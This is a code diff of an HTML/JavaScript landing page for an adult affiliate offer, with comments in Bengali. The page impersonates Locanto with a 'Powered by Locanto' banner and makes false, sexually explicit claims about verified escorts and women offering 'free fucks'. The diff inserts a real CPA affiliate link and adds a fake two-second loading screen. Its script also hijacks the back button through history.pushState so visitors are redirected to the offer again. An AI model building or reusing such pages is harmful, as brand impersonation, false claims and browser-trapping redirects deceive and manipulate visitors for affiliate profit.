@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Locanto Meetups</title>
+    <title>Locanto Hookup</title>
     <style>
         * {
             margin: 0;
@@ -17,9 +17,23 @@
             height: 100%;
             overflow: hidden;
             background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
-        /* ব্যাকগ্রাউন্ড স্লাইডার */
+        /* পিসি/ট্যাবেও যেন মোবাইলের মতো ফ্রেম আকারে দেখায় */
+        .app-container {
+            position: relative;
+            width: 100%;
+            max-width: 480px; /* মোবাইল ফ্রেম সাইজ */
+            height: 100vh;
+            overflow: hidden;
+            background: #000;
+            box-shadow: 0 0 20px rgba(0,0,0,0.8);
+        }
+
+        /* ব্যাকগ্রাউন্ড স্লাইডার (ন্যাচারাল পিকচার, নো ডার্ক ওভারলে) */
         .bg-slider {
             position: absolute;
             top: 0;
@@ -42,17 +56,6 @@
             opacity: 1;
         }
 
-        /* ওভারলে */
-        .overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.65);
-            z-index: 2;
-        }
-
         /* মেইন কন্টেন্ট */
         .content {
             position: relative;
@@ -60,91 +63,113 @@
             height: 100%;
             display: flex;
             flex-direction: column;
-            justify-content: center;
+            justify-content: space-between;
             align-items: center;
-            padding: 20px;
+            padding: 20px 15px 30px 15px;
             text-align: center;
             color: #fff;
         }
 
+        /* একদম ডিসপ্লের টপে লোগো ও Powered by */
+        .top-header {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 5px;
+        }
+
         .logo-banner {
             max-width: 220px;
-            width: 80%;
-            margin-bottom: 12px;
+            width: 75%;
+            margin-bottom: 6px;
+            filter: drop-shadow(0px 2px 4px rgba(0,0,0,0.8));
         }
 
         .powered-by {
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 18px;
+            font-size: 15px;
+            font-weight: 700;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.9);
             letter-spacing: 0.5px;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 3px 12px;
+            border-radius: 12px;
         }
 
         /* Locanto কালারিং Style */
         .locanto {
-            font-weight: bold;
+            font-weight: 800;
         }
         .locanto .lo { color: #007bff; }     /* Blue */
         .locanto .can { color: #ff9800; }    /* Lite Orange */
         .locanto .to { color: #e65100; }     /* Deep Orange */
 
-        .description {
-            max-width: 480px;
-            font-size: 15px;
-            line-height: 1.5;
-            margin-bottom: 25px;
-            background: rgba(0, 0, 0, 0.4);
-            padding: 15px;
-            border-radius: 10px;
-            backdrop-filter: blur(5px);
+        /* মাঝখানের ডেসক্রিপশন বক্স - ৯৫% স্বচ্ছ (পেছনের ছবি ৯৫% দেখা যাবে) */
+        .description-box {
+            width: 100%;
+            max-width: 420px;
+            font-size: 18px; /* বড় লেখা */
+            line-height: 1.6;
+            font-weight: 600;
+            background: rgba(0, 0, 0, 0.05); /* ৯৫% ট্র্যান্সপারেন্ট */
+            padding: 25px 18px; /* লম্বায় বড় বক্স */
+            border-radius: 16px;
+            border: 1px solid rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(2px);
+            text-shadow: 0 2px 5px rgba(0,0,0,0.95);
+            margin: auto 0;
         }
 
         /* অফার বাটন */
         .cta-btn {
             background: linear-gradient(135deg, #ff0055, #ff5000);
             color: #fff;
-            font-size: 20px;
+            font-size: 22px;
             font-weight: bold;
-            padding: 16px 36px;
-            border: none;
+            padding: 16px 40px;
+            border: 2px solid #fff;
             border-radius: 50px;
             cursor: pointer;
             text-decoration: none;
-            box-shadow: 0 4px 15px rgba(255, 0, 85, 0.4);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.6);
             transition: transform 0.2s, background 0.3s;
             text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
         }
 
-        .cta-btn:hover {
-            transform: scale(1.05);
+        .cta-btn:active {
+            transform: scale(0.96);
         }
 
-        /* বাফারিং লোডার স্ক্রিন (Blur Effect) */
+        /* ৮০% ব্লার ও ২ সেকেন্ডের ফেক বাফারিং স্ক্রিন */
         .loading-screen {
             display: none;
-            position: fixed;
+            position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(10px);
-            -webkit-backdrop-filter: blur(10px);
+            background: rgba(0, 0, 0, 0.8); /* ৮০% ব্লার/ঝাপসা */
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
             z-index: 10;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             color: #fff;
+            text-align: center;
+            padding: 20px;
         }
 
         .spinner {
-            width: 50px;
-            height: 50px;
+            width: 55px;
+            height: 55px;
             border: 5px solid rgba(255, 255, 255, 0.2);
             border-top: 5px solid #ff0055;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            margin-top: 15px;
+            margin-top: 20px;
         }
 
         @keyframes spin {
@@ -155,38 +180,41 @@
 </head>
 <body>
 
-    <!-- স্লাইডার ইমেজ (১ সেকেন্ড পর পর চেঞ্জ হবে) -->
-    <div class="bg-slider">
-        <img src="fuck1.webp" class="active" alt="Background 1">
-        <img src="fuck2.webp" alt="Background 2">
-        <img src="fuck3.webp" alt="Background 3">
-        <img src="fuck4.webp" alt="Background 4">
-        <img src="fuck5.webp" alt="Background 5">
-    </div>
-
-    <!-- ব্যাকগ্রাউন্ড কালো শেড -->
-    <div class="overlay"></div>
-
-    <!-- ল্যান্ডিং পেজের কন্টেন্ট -->
-    <div class="content">
-        <img src="fucklogo.webp" alt="Logo" class="logo-banner">
-        
-        <div class="powered-by">
-            Powered by <span class="locanto"><span class="lo">Lo</span><span class="can">can</span><span class="to">to</span></span>
+    <div class="app-container">
+        <!-- স্লাইডার ইমেজ (১ সেকেন্ড পর পর চেঞ্জ হবে, আসল ন্যাচারাল কালার) -->
+        <div class="bg-slider">
+            <img src="fuck1.webp" class="active" alt="Background 1">
+            <img src="fuck2.webp" alt="Background 2">
+            <img src="fuck3.webp" alt="Background 3">
+            <img src="fuck4.webp" alt="Background 4">
+            <img src="fuck5.webp" alt="Background 5">
         </div>
 
-        <div class="description">
-            Thousands of <span class="locanto"><span class="lo">Lo</span><span class="can">can</span><span class="to">to</span></span> Escorts, single women, and single moms are using this website for casual hookups and looking for free fucks. All users have 100% verified profiles. This site is specifically designed for <span class="locanto"><span class="lo">Lo</span><span class="can">can</span><span class="to">to</span></span> users to connect for free fucks.
+        <!-- মেইন কন্টেন্ট -->
+        <div class="content">
+            <!-- একদম উপরে লোগো ও Powered By -->
+            <div class="top-header">
+                <img src="fucklogo.webp" alt="Logo" class="logo-banner">
+                <div class="powered-by">
+                    Powered by <span class="locanto"><span class="lo">Lo</span><span class="can">can</span><span class="to">to</span></span>
+                </div>
+            </div>
+
+            <!-- মাঝখানে বড় ট্র্যান্সপারেন্ট ডেসক্রিপশন বক্স -->
+            <div class="description-box">
+                Thousands of <span class="locanto"><span class="lo">Lo</span><span class="can">can</span><span class="to">to</span></span> Escorts, single women, and single moms are using this website for casual hookups and looking for free fucks. All users have 100% verified profiles. This site is specifically designed for <span class="locanto"><span class="lo">Lo</span><span class="can">to</span></span> users to connect for free fucks.
+            </div>
+
+            <!-- নিচে বাটন -->
+            <button class="cta-btn" onclick="handleClick()">Let's Free Fuck</button>
         </div>
 
-        <button class="cta-btn" onclick="handleClick()">Let's Free Fuck</button>
-    </div>
-
-    <!-- ৮০০% ব্লার ও লোডিং স্ক্রিন -->
-    <div class="loading-screen" id="loader">
-        <img src="fucklogo.webp" alt="Logo" style="max-width: 180px; margin-bottom: 10px;">
-        <h3 style="font-weight: 500;">Free Signup Page Loading...</h3>
-        <div class="spinner"></div>
+        <!-- ৮০% ঝাপসা এবং ২ সেকেন্ডের ফেক বাফারিং স্ক্রিন -->
+        <div class="loading-screen" id="loader">
+            <img src="fucklogo.webp" alt="Logo" style="max-width: 190px; margin-bottom: 15px;">
+            <h3 style="font-weight: 600; font-size: 20px;">Free Signup Page Loading...</h3>
+            <div class="spinner"></div>
+        </div>
     </div>
 
     <script>
@@ -200,10 +228,10 @@
             images[currentIndex].classList.add('active');
         }, 1000);
 
-        // ২. অফার লিংক (এখানে আপনার CPA / Affiliate Link বসাবেন)
-        const affiliateLink = "YOUR_AFFILIATE_LINK_HERE";
+        // ২. আপনার CPA / Affiliate Link বসাবেন
+        const affiliateLink = "https://paysale.g2afse.com/click?pid=125904&offer_id=9792";
 
-        // ৩. বট প্রোটেকশন (প্রথম ২ সেকেন্ড ক্লিক লক থাকবে)
+        // ৩. বট প্রোটেকশন (প্রথম ২ সেকেন্ড ক্লিক ডিজেবল থাকবে)
         let canClick = false;
         setTimeout(() => {
             canClick = true;
@@ -211,7 +239,7 @@
 
         // ৪. বাটনে ক্লিক করার ফাংশন
         function handleClick() {
-            if (!canClick) return; // ২ সেকেন্ডের আগে বট বা ক্লিক কাজ করবে না
+            if (!canClick) return; // ২ সেকেন্ডের আগে কোনো ক্লিক বা বট অ্যাকশন কাজ করবে না
 
             showLoaderAndRedirect();
         }
@@ -220,13 +248,13 @@
             const loader = document.getElementById('loader');
             loader.style.display = 'flex';
 
-            // ১ সেকেন্ড ফেইক লোডিং দেখিয়ে অফার লিংকে পাঠাবে
+            // ২ সেকেন্ড ফেইক লোডিং দেখিয়ে অফার লিংকে পাঠাবে
             setTimeout(() => {
                 window.location.href = affiliateLink;
-            }, 1000);
+            }, 2000);
         }
 
-        // ৫. ব্যাক বাটন রিডাইরেক্ট (ভিজিটর ব্যাক করলে আবার ১ সেকেন্ড লোডার দেখিয়ে অফার লিংকে পাঠাবে)
+        // ৫. ব্যাক বাটন রিডাইরেক্ট (ভিজিটর ব্যাক করলে ২ সেকেন্ড ফেক লোডার দেখিয়ে আবার লিংকে পাঠাবে)
         history.pushState(null, null, location.href);
         window.onpopstate = function () {
             history.pushState(null, null, location.href);
